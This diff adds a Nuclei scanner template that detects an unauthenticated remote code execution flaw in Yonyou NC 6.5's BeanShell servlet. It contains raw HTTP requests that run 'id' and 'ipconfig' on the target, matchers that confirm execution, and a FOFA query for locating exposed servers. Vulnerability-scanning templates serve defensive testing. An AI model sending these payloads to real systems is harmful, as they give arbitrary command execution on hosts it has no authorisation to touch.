@@ -1,0 +1,42 @@
+id: BeanShell_RCE
+info:
+  name: 用友NC6.5_BeanShell_RCE
+  author: mike
+  severity: info
+  description: xxx
+  reference: https://www.cnblogs.com/pursue-security/p/17685141.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: title=="YONYOU NC"
+http:
+  - raw:
+      - | #linux
+        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=exec("id");
+
+      - | #windows
+        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=exec("ipconfig");
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid="
+          - "Windows IP"
+        condition: or
+
+      - type: word
+        words:
+          - "BeanShell Test Servlet"
+
+      - type: status
+        status:
+          - 200
